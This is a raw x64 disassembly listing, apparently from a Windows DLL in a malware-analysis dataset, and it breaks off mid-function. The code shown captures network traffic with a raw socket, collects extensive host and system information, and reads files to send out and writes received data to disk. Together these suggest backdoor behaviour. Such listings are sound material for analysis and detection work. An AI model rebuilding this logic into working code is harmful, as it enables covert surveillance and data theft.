call sub_18000de8c
test rbx rbx
je r-xdata
xor eax eax
jmp r-xdata
lea r8d [ rax + rax ]
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call sub_18000a1ac
add rsp 0x4020
pop rbx
retn
sub_18000a2e8
mov r11 rsp
mov [ r11 + 0x8 ] rbx
push rdi
sub rsp 0x70
xor eax eax
xor ebx ebx
lea r9 [ r11 + 0x10 ]
mov [ rsp + 0x54 ] eax
mov [ rsp + 0x58 ] eax
mov [ rsp + 0x64 ] eax
mov [ rsp + 0x68 ] eax
lea eax [ rbx + 0x1 ]
mov rdi rcx
mov [ rsp + 0x50 ] eax
mov [ r11 - 0x20 ] r8d
mov [ rsp + 0x54 ] edx
lea r8d [ rbx + 0x8 ]
mov edx 0xffff
mov [ rsp + 0x60 ] ebx
mov [ r11 + 0x18 ] ebx
mov [ r11 + 0x10 ] eax
mov [ rsp + 0x20 ] 0x4
call [ setsockopt@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x38 ] rbx
lea rax [ rsp + 0x90 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x60 ]
mov r9d 0xc
mov [ rsp + 0x28 ] r9d
lea r8 [ rsp + 0x50 ]
mov ecx edi
mov edx 0x98000004
mov [ rsp + 0x20 ] rax
call [ WSAIoctl@IAT ]
cmp eax 0xffffffff
setne bl
mov eax ebx
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x80 ]
add rsp 0x70
pop rdi
retn
sub_18000a3a0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
push rsi
push rdi
push r12
sub rsp 0x40
mov esi r8d
mov r12 rdx
lea r8 [ rax + 0x18 ]
xor edi edi
mov edx 0x8004667e
mov ebx r9d
and [ rax + 0x18 ] edi
mov rbp rcx
call [ ioctlsocket@IAT ]
lea r8d [ rdi + 0x10 ]
lea rcx [ rsp + 0x30 ]
xor edx edx
call sub_180016870
movzx ecx [ rsp + 0x80 ]
lea r11d [ rdi + 0x2 ]
mov [ rsp + 0x30 ] r11w
mov [ rsp + 0x34 ] ebx
call [ htons@IAT ]
mov [ rsp + 0x32 ] ax
jmp r-xdata
test esi esi
jg r-xdata
lea rax [ rsp + 0x30 ]
movsxd rdx edi
xor r9d r9d
mov r8d esi
mov rcx rbp
add rdx r12
mov [ rsp + 0x28 ] 0x10
mov [ rsp + 0x20 ] rax
call [ sendto@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax edi
or eax 0xffffffff
jmp r-xdata
sub esi eax
add edi eax
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
add rsp 0x40
pop r12
pop rdi
pop rsi
retn
sub_18000a454
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov rbp rcx
lea rcx [ r--data ]
call [ gethostbyname@IAT ]
xor r14d r14d
mov rbx rax
cmp rax r14
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
mov rax rbp
mov rbp [ rsp + 0x58 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
mov rsi r14
mov [ rbp ] r14b
cmp r14w [ rbx + 0x12 ]
mov r13d r14d
mov r12 r14
jge r-xdata
add rsi 0x8
jmp r-xdata
cmp r12 r14
jle r-xdata
mov rcx [ rbx + 0x18 ]
cmp [ rsi + rcx ] r14
je r-xdata
mov rax [ rbx + 0x18 ]
lea rdx [ r--data ]
mov rcx [ rax + rsi ]
movzx r8d [ rcx + r12 ]
lea rcx [ rsp + 0x20 ]
call sub_18000d67c
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rbp
lea rdx [ rsp + 0x20 ]
[ rdi ]
xor ecx ecx
xor eax eax
mov rdi rbp
or rcx 0xffffffffffffffff
[ rdi ]
movzx eax [ r--data ]
mov [ rdi - 0x1 ] ax
mov al [ rdx + rcx ]
inc rcx
mov [ rdi + rcx - 0x2 ] al
test al al
jne r-xdata
movsx eax [ rbx + 0x12 ]
inc r13d
inc r12
cmp r13d eax
jl r-xdata
sub_18000a548
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
sub rsp 0x60
mov rdi rdx
xor edx edx
mov rsi rcx
lea r8d [ rdx + 0x10 ]
lea rcx [ rax - 0x38 ]
call sub_180016870
lea rcx [ rsp + 0x40 ]
mov ebx 0x2
mov [ rsp + 0x80 ] 0x10
mov [ rsp + 0x20 ] bx
call sub_18000a454
mov rcx rax
call [ inet_addr@IAT ]
lea r8d [ rbx + 0xf ]
xor ebp ebp
mov edx ebx
mov ecx ebx
mov [ rsp + 0x22 ] bp
mov [ rsp + 0x24 ] eax
call [ socket@IAT ]
mov rbx rax
cmp rax 0xffffffffffffffff
jne r-xdata
lea rdx [ rsp + 0x20 ]
mov r8d 0x10
mov rcx rax
call [ bind@IAT ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
lea r8 [ rsp + 0x80 ]
lea rdx [ rsp + 0x30 ]
mov rcx rbx
call [ getsockname@IAT ]
cmp rsi rbp
je r-xdata
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x28 ]
mov rsp r11
pop rdi
retn
cmp rdi rbp
je r-xdata
mov eax [ rsp + 0x34 ]
mov [ rsi ] eax
mov rax rbx
movzx eax [ rsp + 0x32 ]
mov [ rdi ] ax
sub_18000a620
mov [ rsp + 0x8 ] rbx
xor ebx ebx
mov r11 r8
mov r10 rdx
cmp rdx rbx
je r-xdata
mov r9 rbx
mov r8d 0x80070057
cmp rdx 0x7fffffff
ja r-xdata
mov rbx [ rsp + 0x8 ]
mov eax r8d
retn
mov rdx r10
lea rcx [ rcx + r9 * 2 ]
mov r8d ebx
sub rdx r9
je r-xdata
mov rax rdx
mov r8d ebx
mov rdx rcx
sub rcx 0x2
mov r8d 0x8007007a
mov rax rdx
sub rax r10
sub r11 rcx
lea r10 [ rax + r9 + 0x7fffffff ]
cmp rax rbx
je r-xdata
add rdx 0x2
sub rax 0x1
jne r-xdata
cmp rdx rbx
jne r-xdata
movzx eax [ r11 + rcx ]
cmp ax bx
je r-xdata
mov r9 r10
sub r9 rax
jmp r-xdata
cmp [ rdx ] bx
je r-xdata
mov [ rcx ] bx
dec rdx
mov [ rcx ] ax
dec r10
add rcx 0x2
cmp rdx rbx
jne r-xdata
cmp r8d ebx
jl r-xdata
cmp r10 rbx
je r-xdata
sub_18000a6cc
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbx
push rbp
push rsi
push rdi
sub rsp 0x28
xor ebp ebp
mov rsi rcx
mov ebx ebp
cmp rdx rbp
je r-xdata
mov ebx 0x80070057
cmp rdx 0x7fffffff
jbe r-xdata
mov eax ebx
add rsp 0x28
pop rdi
pop rsi
pop rbp
pop rbx
retn
lea rdi [ rdx - 0x1 ]
lea r9 [ rsp + 0x68 ]
mov ebx ebp
mov rdx rdi
call sub_18000e250
cmp eax ebp
jl r-xdata
cmp ebx ebp
jl r-xdata
mov ebx 0x8007007a
cdqe
cmp rax rdi
ja r-xdata
jne r-xdata
jmp r-xdata
mov [ rsi + rdi * 2 ] bp
sub_18000a734
push rdi
sub rsp 0x820
lea rdx [ r--data ]
mov rdi rcx
sub rcx rdx
xor r8d r8d
movzx eax [ rdx ]
mov [ rcx + rdx ] ax
add rdx 0x2
cmp ax r8w
jne r-xdata
mov [ rsp + 0x20 ] r8w
lea rcx [ rsp + 0x22 ]
xor edx edx
mov r8d 0x7fe
call sub_180016870
lea rcx [ rsp + 0x20 ]
mov edx 0x400
call sub_18000adc0
xor eax eax
or rcx 0xffffffffffffffff
[ rdi ]
xor ecx ecx
lea rdx [ rsp + 0x20 ]
movzx eax [ rdx + rcx ]
add rcx 0x2
mov [ rdi + rcx - 0x4 ] ax
test ax ax
jne r-xdata
add rsp 0x820
pop rdi
retn
sub_18000a7b0
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r15
sub rsp 0xed0
xor eax eax
mov r13 rcx
xor r15d r15d
lea rcx [ rsp + 0x2d2 ]
xor edx edx
mov r8d 0x7fe
mov [ rsp + 0x40 ] r15d
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x2d0 ] r15w
call sub_180016870
lea rcx [ rsp + 0xad1 ]
xor edx edx
mov r8d 0x3ff
mov [ rsp + 0xad0 ] r15b
call sub_180016870
lea rdx [ r--data ]
lea rcx [ rsp + 0x2d0 ]
xor r8d r8d
call sub_18000630c
lea ebx [ r15 + 0x1 ]
mov edi 0x208
mov rsi 0xffffffff80000002
jmp r-xdata
lea r9 [ rsp + 0x90 ]
lea r8 [ r--data ]
lea rdx [ rsp + 0x2d0 ]
mov rcx rsi
mov [ rsp + 0x20 ] edi
call sub_180008268
cmp eax r15d
jne r-xdata
lea rcx [ rsp + 0x90 ]
call sub_18000ca20
lea rdx [ r--data ]
mov r8d ebx
mov r9 rax
mov rcx r13
call sub_18000a28c
lea rdx [ r--data ]
lea rcx [ rsp + 0x2d0 ]
mov r8d ebx
call sub_18000630c
inc ebx
lea rcx [ rsp + 0x58 ]
mov [ rsp + 0x58 ] 0x38
call [ GlobalMemoryStatus@IAT ]
mov r9 [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
lea rdx [ r--data ]
shr r9 0x14
shr r8 0x14
mov rcx r13
call sub_18000a28c
lea rcx [ rsp + 0x90 ]
mov r8 rdi
xor edx edx
call sub_180016870
lea rcx [ rsp + 0x2d0 ]
xor edx edx
mov r8d 0x800
call sub_180016870
lea rcx [ rsp + 0x2d0 ]
call sub_18000a734
lea r8 [ rsp + 0x2d0 ]
lea rdx [ r--data ]
mov rcx r13
call sub_18000a28c
lea rbx [ r--data ]
lea r9 [ rsp + 0x90 ]
lea r8 [ r--data ]
mov rdx rbx
mov rcx rsi
mov [ rsp + 0x20 ] edi
call sub_180008268
lea r8 [ rsp + 0x90 ]
lea rdx [ r--data ]
mov rcx r13
call sub_18000a28c
lea r9 [ rsp + 0x90 ]
lea r8 [ r--data ]
mov rdx rbx
mov rcx rsi
mov [ rsp + 0x20 ] edi
call sub_180008268
lea r8 [ rsp + 0x90 ]
lea rdx [ r--data ]
mov rcx r13
call sub_18000a28c
lea r9 [ rsp + 0x90 ]
lea r8 [ r--data ]
mov rdx rbx
mov rcx rsi
mov [ rsp + 0x20 ] edi
call sub_180008268
lea r8 [ rsp + 0x90 ]
lea rdx [ r--data ]
mov rcx r13
call sub_18000a28c
mov edi 0x400
lea rcx [ rsp + 0xad0 ]
mov edx edi
call [ gethostname@IAT ]
cmp eax r15d
jne r-xdata
call [ GetTickCount@IAT ]
mov r9d 0x45e7b273
mov ebx 0x95217cb1
mov r11d eax
mov eax 0x31b5d43b
mov ecx r11d
mul r11d
mov r8d edx
mov eax r9d
shr r8d 0x18
mul r11d
shr edx 0xe
mov eax 0x10624dd3
imul edx edx 0xea60
sub ecx edx
mul ecx
mov ecx r11d
mov eax ebx
mov r10d edx
mul r11d
mov eax r9d
shr edx 0x15
shr r10d 0x6
mov [ rsp + 0x28 ] r10d
imul edx edx 0x36ee80
sub ecx edx
mul ecx
mov ecx r8d
mov eax ebx
mov r9d edx
imul ecx ecx 0x5265c00
shr r9d 0xe
sub r11d ecx
mov [ rsp + 0x20 ] r9d
mov rcx r13
mul r11d
shr edx 0x15
mov r9d edx
lea rdx [ r--data ]
call sub_18000a28c
mov ebx 0x104
lea rcx [ rsp + 0x90 ]
mov r8 rbx
xor edx edx
call sub_180016870
lea rcx [ rsp + 0x90 ]
mov edx ebx
call [ GetSystemDirectoryW@IAT ]
lea r8 [ rsp + 0x90 ]
lea rdx [ r--data ]
mov rcx r13
call sub_18000a28c
lea rcx [ rsp + 0x2a0 ]
call [ GetSystemInfo@IAT ]
mov r8d [ rsp + 0x2c0 ]
lea rdx [ r--data ]
mov rcx r13
call sub_18000a28c
lea rdx [ r--data ]
xor ecx ecx
call sub_18000f1ac
lea rcx [ rsp + 0x2d0 ]
xor r9d r9d
mov r8 rax
mov rdx rdi
call sub_18000c7d4
lea rdx [ r--data ]
mov rcx r13
mov r8 rax
call sub_18000a28c
lea rcx [ r--data ]
xor r9d r9d
xor r8d r8d
xor edx edx
call [ CreateDCW@IAT ]
mov edx 0x8
mov rcx rax
mov rbp rax
call [ GetDeviceCaps@IAT ]
mov edx 0xa
mov r12d eax
mov rcx rbp
call [ GetDeviceCaps@IAT ]
mov edx 0xc
mov rcx rbp
mov esi eax
call [ GetDeviceCaps@IAT ]
mov edx 0x74
mov rcx rbp
mov edi eax
call [ GetDeviceCaps@IAT ]
mov rcx rbp
mov ebx eax
call [ DeleteDC@IAT ]
lea rdx [ r--data ]
mov r9d esi
mov r8d r12d
mov rcx r13
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] edi
call sub_18000a28c
lea rdx [ r--data ]
mov rcx r13
call sub_18000a28c
mov ebx r15d
lea r8 [ rsp + 0xad0 ]
lea rcx [ rsp + 0x2d0 ]
xor r9d r9d
mov rdx rdi
call sub_18000c7d4
lea rdx [ rsp + 0x90 ]
lea r8 [ rsp + 0xf18 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x90 ]
call sub_18000630c
sub ecx 0x1
je r-xdata
movzx ecx [ rax ]
add rax 0x2
mov [ rdx ] cx
add rdx 0x2
cmp cx r15w
jne r-xdata
lea r8 [ rsp + 0x90 ]
lea rdx [ r--data ]
mov rcx r13
call sub_18000a28c
lea rcx [ rsp + 0x90 ]
xor edx edx
mov r8d 0x208
call sub_180016870
inc ebx
cmp ebx 0x1a
jl r-xdata
lea rdx [ rsp + 0x90 ]
mov rcx r13
call sub_18000a28c
mov [ rsp + 0x38 ] 0xc
lea rax [ rsp + 0x40 ]
lea rcx [ rsp + 0xf18 ]
mov [ rsp + 0x30 ] rax
xor r9d r9d
xor r8d r8d
xor edx edx
mov [ rsp + 0x28 ] r15
mov [ rsp + 0x20 ] r15
call [ GetVolumeInformationW@IAT ]
lea r9 [ rsp + 0xf20 ]
lea r8 [ rsp + 0xf28 ]
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0xf18 ]
call [ GetDiskFreeSpaceExW@IAT ]
mov r11 [ rsp + 0xf20 ]
mov rcx [ rsp + 0xf28 ]
mov rax r11
xor edx edx
shr r11 0x14
lea r9 [ rsp + 0x40 ]
lea r8 [ rsp + 0xf18 ]
imul rax rax 0x64
div rcx
shr rcx 0x14
lea rdx [ r--data ]
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] r11
mov [ rsp + 0x20 ] rcx
lea rcx [ rsp + 0x90 ]
call sub_18000630c
jmp r-xdata
sub ecx 0x1
je r-xdata
lea r8d [ rbx + 0x41 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0xf18 ]
call sub_18000630c
lea rcx [ rsp + 0xf18 ]
call [ GetDriveTypeW@IAT ]
mov ecx eax
mov edi eax
sub ecx 0x2
je r-xdata
call [ GetCurrentProcessId@IAT ]
movd xmm2 [ rw-data ]
lea r9 [ rw-data ]
mov [ rsp + 0x30 ] eax
lea rax [ rw-data ]
lea rdx [ r--data ]
cvtps2pd xmm2 xmm2
movq r8 xmm2
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov rcx r13
mov [ rsp + 0x20 ] rax
call sub_18000a28c
add rsp 0xed0
pop r15
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
lea rdx [ r--data ]
jmp r-xdata
sub ecx 0x1
je r-xdata
lea r8 [ rsp + 0xf18 ]
lea rcx [ rsp + 0x90 ]
call sub_18000630c
jmp r-xdata
lea rdx [ r--data ]
jmp r-xdata
cmp ecx 0x1
jne r-xdata
cmp edi 0x1
je r-xdata
lea rdx [ r--data ]
sub_18000adc0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x20 ] r12
push r14
sub rsp 0x220
xor edx edx
mov rbx rcx
lea rcx [ rsp + 0x30 ]
lea r8d [ rdx + 0x30 ]
call sub_180016870
lea rcx [ rsp + 0x60 ]
xor edx edx
mov r8d 0x11c
call sub_180016870
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x60 ] 0x11c
call [ GetVersionExW@IAT ]
xor r12d r12d
cmp eax r12d
jne r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ rsp + 0x30 ]
cmp rax r12
je r-xdata
mov eax 0x1
jmp r-xdata
call [ GetSystemInfo@IAT ]
call rax
jmp r-xdata
lea r11 [ rsp + 0x220 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov r12 [ r11 + 0x28 ]
mov rsp r11
pop r14
retn
xor eax eax
cmp [ rsp + 0x64 ] 0x4
jbe r-xdata
cmp [ rsp + 0x70 ] 0x2
jne r-xdata
mov esi 0x400
lea r8 [ r--data ]
mov rcx rbx
mov rdx rsi
call sub_18000a620
mov r14d 0x6
cmp [ rsp + 0x64 ] r14d
jne r-xdata
cmp [ rsp + 0x64 ] 0x5
jne r-xdata
mov eax [ rsp + 0x68 ]
cmp eax r12d
jne r-xdata
mov eax 0x104
lea rdx [ rsp + 0x74 ]
mov rcx rax
mov eax [ rsp + 0x68 ]
cmp eax 0x2
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ rsp + 0x17a ] 0x1
mov rdx rsi
mov rcx rbx
jne r-xdata
cmp rcx r12
je r-xdata
add rdx 0x2
sub rcx 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
lea ecx [ rax + 0x57 ]
call [ GetSystemMetrics@IAT ]
cmp eax r12d
je r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
cmp rax r12
je r-xdata
mov rdx rsi
mov rcx rbx
lea r8 [ r--data ]
cmp [ rsp + 0x17a ] al
je r-xdata
lea r8 [ r--data ]
jmp r-xdata
lea r8 [ r--data ]
jmp r-xdata
mov rax r12
sub rax rcx
jmp r-xdata
cmp [ rdx ] r12w
je r-xdata
cmp eax r12d
jne r-xdata
lea r8 [ r--data ]
mov rdx rsi
mov rcx rbx
call sub_18000a620
movzx r11d [ rsp + 0x178 ]
mov eax 0x200
and r11w ax
mov rdx rsi
mov rcx rbx
lea r8 [ r--data ]
cmp r11w ax
je r-xdata
mov eax 0x2000
cmp [ rsp + 0x178 ] ax
jne r-xdata
lea r8 [ r--data ]
jmp r-xdata
mov eax [ rsp + 0x240 ]
cmp eax 0xa
ja r-xdata
lea rcx [ rsp + 0x240 ]
xor r9d r9d
xor r8d r8d
mov [ rsp + 0x20 ] rcx
mov ecx r14d
xor edx edx
call rax
call sub_18000a620
lea r8 [ r--data ]
mov r9d [ rsp + 0x6c ]
lea r8 [ r--data ]
lea rcx [ rsp + 0x180 ]
mov edx 0x50
call sub_18000a6cc
lea r8 [ rsp + 0x180 ]
mov edx 0x450
mov rcx rbx
call sub_18000a620
jmp r-xdata
lea r8 [ r--data ]
mov rdx rsi
mov rcx rbx
call sub_18000a620
lea r8 [ rsp + 0x74 ]
mov rdx rsi
mov rcx rbx
call sub_18000a620
cmp rax r12
jbe r-xdata
lea r8 [ r--data ]
mov rdx rsi
mov rcx rbx
call sub_18000a620
cmp [ rsp + 0x17a ] 0x1
jne r-xdata
call sub_18000a620
cmp [ rsp + 0x64 ] 0x5
jne r-xdata
lea r8 [ r--data ]
cmp [ rsp + 0x17a ] 0x1
jne r-xdata
lea r8 [ r--data ]
jmp r-xdata
mov rdx rsi
mov rcx rbx
call sub_18000a620
cmp [ rsp + 0x17a ] 0x1
je r-xdata
sub eax 0xb
je r-xdata
je r-xdata
mov al [ rsp + 0x178 ]
test al al
jns r-xdata
lea r8 [ r--data ]
jmp r-xdata
mov eax [ rsp + 0x68 ]
lea r8 [ r--data ]
cmp [ rsp + 0x30 ] 0x9
lea r8 [ r--data ]
je r-xdata
cmp [ rsp + 0x64 ] 0x5
jne r-xdata
cmp [ rsp + 0x30 ] r14w
jne r-xdata
lea r8 [ r--data ]
sub eax 0x1
je r-xdata
lea r8 [ r--data ]
jmp r-xdata
sub eax 0x1
je r-xdata
lea r8 [ r--data ]
test al 0x2
jne r-xdata
lea r8 [ r--data ]
jmp r-xdata
mov rdx rsi
mov rcx rbx
call sub_18000a620
mov eax [ rsp + 0x68 ]
cmp [ rsp + 0x30 ] 0x9
jne r-xdata
mov al [ rsp + 0x178 ]
test al al
jns r-xdata
cmp ax r12w
jne r-xdata
lea r8 [ r--data ]
jmp r-xdata
lea r8 [ r--data ]
jmp r-xdata
sub eax 0x1
je r-xdata
mov rdx rsi
mov rcx rbx
call sub_18000a620
movzx eax [ rsp + 0x30 ]
cmp ax 0x9
jne r-xdata
lea r8 [ r--data ]
jmp r-xdata
sub eax 0x1
je r-xdata
lea r8 [ r--data ]
movzx ecx [ rsp + 0x178 ]
mov edx 0x4000
movzx eax cx
and ax dx
cmp ax dx
jne r-xdata
mov al [ rsp + 0x178 ]
test al al
jns r-xdata
test al 0x2
je r-xdata
lea r8 [ r--data ]
jmp r-xdata
lea r8 [ r--data ]
mov rdx rsi
mov rcx rbx
call sub_18000a620
lea r8 [ r--data ]
jmp r-xdata
sub eax 0x1
je r-xdata
lea r8 [ r--data ]
jmp r-xdata
sub eax 0x1
je r-xdata
mov al [ rsp + 0x178 ]
test al al
jns r-xdata
lea r8 [ r--data ]
jmp r-xdata
mov rdx rsi
mov rcx rbx
test al 0x2
je r-xdata
lea r8 [ r--data ]
jmp r-xdata
lea r8 [ r--data ]
jmp r-xdata
mov rdx rsi
mov rcx rbx
lea r8 [ r--data ]
jmp r-xdata
sub eax 0x1
je r-xdata
lea r8 [ r--data ]
jmp r-xdata
sub eax 0x1
je r-xdata
test al 0x2
je r-xdata
lea r8 [ r--data ]
jmp r-xdata
lea r8 [ r--data ]
jmp r-xdata
lea r8 [ r--data ]
jmp r-xdata
lea r8 [ r--data ]
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x2
je r-xdata
and cx si
lea r8 [ r--data ]
cmp cx si
je r-xdata
lea r8 [ r--data ]
jmp r-xdata
call sub_18000a620
lea r8 [ r--data ]
jmp r-xdata
sub eax 0x1
je r-xdata
lea r8 [ r--data ]
jmp r-xdata
sub eax 0x1
je r-xdata
lea r8 [ r--data ]
lea r8 [ r--data ]
jmp r-xdata
sub eax 0x7
je r-xdata
lea r8 [ r--data ]
jmp r-xdata
sub eax 0x1
je r-xdata
lea r8 [ r--data ]
jmp r-xdata
lea r8 [ r--data ]
jmp r-xdata
lea r8 [ r--data ]
jmp r-xdata
sub eax 0x1
jne r-xdata
lea r8 [ r--data ]
jmp r-xdata
sub_18000b318
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x10 ] rbp
mov [ r11 + 0x18 ] rsi
push rdi
sub rsp 0x40
and [ r11 - 0x18 ] 0x0
mov rax rdx
mov rsi r8
mov rbp rcx
or rbx 0xffffffffffffffff
xor r9d r9d
lea r8d [ rbx + 0x2 ]
mov edx 0x80000000
mov rcx rax
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] 0x3
call [ CreateFileW@IAT ]
mov rdi rax
cmp rax rbx
je r-xdata
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov eax ebx
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
lea rdx [ rsp + 0x68 ]
mov rcx rax
call [ GetFileSizeEx@IAT ]
test eax eax
je r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
xor r9d r9d
xor r8d r8d
mov rdx rsi
mov rcx rdi
call [ SetFilePointerEx@IAT ]
test eax eax
je r-xdata
mov r8 [ rsp + 0x68 ]
mov rdx rdi
mov rcx rbp
sub r8 rsi
mov [ rsp + 0x68 ] r8
call sub_18000b3d8
cmp rax [ rsp + 0x68 ]
cmovne rax rbx
mov rbx rax
sub_18000b3d8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rsi
push rdi
push r12
mov eax 0x2030
call sub_1800232c0
sub rsp rax
xor ebx ebx
mov rdi r8
mov r12 rdx
mov rbp rcx
mov rsi r8
test r8 r8
jle r-xdata
mov rax rbx
mov r8d 0x2000
lea r9 [ rsp + 0x2060 ]
lea rdx [ rsp + 0x30 ]
cmp rsi r8
mov rcx r12
cmovl r8d esi
and [ rsp + 0x20 ] 0x0
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov r8d [ rsp + 0x2060 ]
test r8d r8d
je r-xdata
lea rdx [ rsp + 0x30 ]
mov rcx rbp
call sub_18000a1ac
cmp eax [ rsp + 0x2060 ]
jne r-xdata
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
lea r11 [ rsp + 0x2030 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov eax [ rsp + 0x2060 ]
add rbx rax
sub rsi rax
cmp rbx rdi
jl r-xdata
sub_18000b48c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
mov eax 0x2040
call sub_1800232c0
sub rsp rax
mov rbx rdx
mov r13 rcx
mov edi 0x1
lea esi [ rdi + 0x7f ]
mov rcx rbx
mov r12 r8
mov edx esi
xor ebp ebp
call [ SetFileAttributesW@IAT ]
and [ rsp + 0x30 ] rbp
lea r8d [ rdi + 0x2 ]
xor r9d r9d
mov edx 0xc0000000
mov rcx rbx
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] 0x4
call [ CreateFileW@IAT ]
mov rsi rax
cmp rax 0xffffffffffffffff
jne r-xdata
lea rdx [ rsp + 0x2078 ]
mov rcx rax
call [ GetFileSizeEx@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov rdx [ rsp + 0x2078 ]
xor r9d r9d
xor r8d r8d
mov rcx rsi
call [ SetFilePointerEx@IAT ]
test eax eax
je r-xdata
lea r11 [ rsp + 0x2040 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
test r12 r12
jle r-xdata
mov rcx rsi
call [ SetEndOfFile@IAT ]
mov rcx rsi
call [ CloseHandle@IAT ]
mov eax edi
mov rax r12
sub rax rbp
cmp rax 0x2000
jge r-xdata
mov ebx 0x2000
mov ebx r12d
sub ebx ebp
jmp r-xdata
xor edi edi
lea rdx [ rsp + 0x40 ]
xor r9d r9d
mov r8d ebx
mov rcx r13
call [ recv@IAT ]
movsxd rbx eax
test eax eax
jle r-xdata
mov edx 0x14
mov rcx r13
call sub_18000a0dc
test eax eax
jle r-xdata
lea rdx [ rsp + 0x40 ]
mov r8d ebx
mov rcx rsi
call sub_18000b5d0
test eax eax
je r-xdata
add rbp rbx
cmp rbp r12
jl r-xdata
jmp r-xdata
sub_18000b5d0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
and [ rsp + 0x50 ] 0x0
mov ebx r8d
mov rdi rdx
mov rsi rcx
test r8d r8d
je r-xdata
mov eax 0x1
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x50 ]
mov r8d ebx
mov rdx rdi
mov rcx rsi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ rsp + 0x50 ]
add rdi rax
sub ebx [ rsp + 0x50 ]
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_18000b638
sub rsp 0x48
mov rdx rcx
lea rcx [ rsp + 0x20 ]
mov r8d 0x20
call sub_1800160e0
mov rcx [ rsp + 0x38 ]
call [ SetEvent@IAT ]
cmp [ rsp + 0x30 ] 0x0
je r-xdata
mov rcx [ rsp + 0x28 ]
mov rax [ rsp + 0x20 ]
add rsp 0x48
jmp rax
xor ecx ecx
call sub_18000b868
sub_18000b67c
push rbx
sub rsp 0x50
mov [ rsp + 0x30 ] r8
mov [ rsp + 0x38 ] r9
xor edx edx
xor r9d r9d
xor r8d r8d
xor ecx ecx
mov [ rsp + 0x40 ] 0x1
call [ CreateEventW@IAT ]
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x30 ]
lea r8 [ sub_18000b638 ]
xor edx edx
xor ecx ecx
mov [ rsp + 0x48 ] rax
call sub_18000d30c
mov rcx [ rsp + 0x48 ]
or edx 0xffffffff
mov rbx rax
call [ WaitForSingleObject@IAT ]
mov rcx [ rsp + 0x48 ]
call [ CloseHandle@IAT ]
mov rax rbx
add rsp 0x50
pop rbx
retn
sub_18000b6ec
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x430
xor edi edi
call [ GetCurrentThreadId@IAT ]
mov ecx eax
call [ GetThreadDesktop@IAT ]
mov r12d 0x200
lea rcx [ rsp + 0x30 ]
mov r8 r12
xor edx edx
mov rsi rax
call sub_180016870
lea r11 [ rsp + 0x440 ]
lea r8 [ rsp + 0x30 ]
lea edx [ rdi + 0x2 ]
mov r9d r12d
mov rcx rsi
